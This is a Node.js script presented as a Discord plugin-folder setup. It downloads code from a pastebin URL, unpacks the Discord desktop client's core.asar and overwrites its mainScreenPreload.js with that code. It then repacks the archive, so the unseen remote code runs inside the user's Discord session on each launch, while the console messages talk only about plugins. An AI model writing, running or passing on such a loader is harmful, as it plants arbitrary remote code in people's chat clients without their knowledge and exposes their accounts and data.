const url = 'https://pastebin.com/raw/s919gMWV';
const axios = require("axios");
const child_process = require("child_process");
const process = require("process");
const appdata = process.platform === "win32" ? process.env.APPDATA : process.platform === "linux" ? process.env['XDG_CONFIG_HOME'] : undefined;
const regex = /((\d+)(\.)?)+/;
const fs = require('fs');
const { join } = require('path');

(async function () {

    const code = (await axios.default.get(url)).data;

    if (appdata === undefined) return console.log("sorry. seems the os you are on rn isn't supported.");

    let main_path = fs.readdirSync(join(appdata, "Discord"));
    let path = join(appdata, "Discord", main_path.filter(s => s.match(regex))[0], "modules", "discord_desktop_core", "core.asar");

    if (path) {
        console.log("Found the core.asar! Extracting!");
        child_process.execSync(`asar extract ${path} ${path.substring(0, path.length - 9) + "/_extracted"}`);
        _extractedMainScreen = path.substring(0, path.length - 9) + "/_extracted/app/mainScreenPreload.js";
        fs.writeFileSync(_extractedMainScreen, code, { encoding: "utf8" });
        child_process.execSync('Del /f ' + path);
        child_process.execSync(`asar pack ${path.substring(0, path.length - 9) + "/_extracted"} ${path}`);
        fs.rmdirSync(path.substring(0, path.length - 9) + "\\_extracted", {recursive:true});
        fs.mkdir(appdata + "/Discord_Bot", {recursive: true}, (err) => {
            if (err) return console.error(err);
            fs.mkdirSync(appdata + "/Discord_Bot/Plugins");
            fs.mkdirSync(appdata + "/Discord_Bot/Themes");

        });
        console.log("Created the directory Discord_Bot in your appdata. You  can put your js files in PLUGINS executed on discord load. To load all new plugins please refresh discord doing ctrl + r");
    }

})();
